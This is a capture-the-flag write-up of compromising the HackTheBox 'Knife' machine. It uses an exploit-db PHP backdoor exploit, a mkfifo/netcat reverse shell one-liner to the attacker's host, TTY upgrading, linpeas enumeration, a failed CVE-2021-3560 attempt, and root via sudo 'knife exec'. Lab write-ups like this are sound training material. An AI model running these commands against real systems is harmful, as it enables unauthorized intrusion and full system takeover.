Via https://www.exploit-db.com/exploits/49933 :D
```
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Knife]
└─$ python3 php_exploit.py         
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ whoami
james

$ id
uid=1000(james) gid=1000(james) groups=1000(james)

```

This is a strange shell...
Hitting enter:
```
$     
No input file specified.

```

Spawning a more interactive shell
```
### target
└─$ python3 php_exploit.py
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1337 >/tmp/f


### attacker
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.242] 42954
/bin/sh: 0: can't access tty; job control turned off
$ 
$ 
$ which python3
/usr/bin/python3
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 4: python: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                          
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Knife]
└─$ stty size;stty raw -echo;fg
39 90
[1]  + continued  nc -lvnp 1337
                               export TERM=xterm-256color
james@knife:/$ 



```

## Poking around
There's a postgres file in /dev/shm, not sure if it's leftover remnants from another attacker.
Leaving it along for now.
```
james@knife:/tmp$ cd /dev/shm
james@knife:/dev/shm$ ls
PostgreSQL.1697720800

```

## Linpeas
snippets
```
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

<SNIP>
Vulnerable to CVE-2021-3560

Lots of postgres opscode stuff running...

<SNIP>
Lots listening, some of these are shells
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9463          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:38329         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37019         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:443           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:16379         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4321          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8999          0.0.0.0:*               LISTEN      33567/sh            
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9680          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37073         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:5432                :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN      -  

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife


```

The sudo version say be vulnerable to [CVE-2021-3156](https://medium.com/fmisec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435), but testing proved otherwise.

## CVE-2021-3560
https://nvd.nist.gov/vuln/detail/CVE-2021-3560
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
poc did not work...
```
james@knife:/tmp$ ./poc.sh -u=james

[!] Username set as : james
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!

```

# knife binary
```
james@knife:/tmp$ file /usr/bin/knife
/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife
```

james@knife:/tmp$ file /usr/bin/knife
/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife

```
james@knife:/tmp$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
root@knife:/tmp# whoami
root
root@knife:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```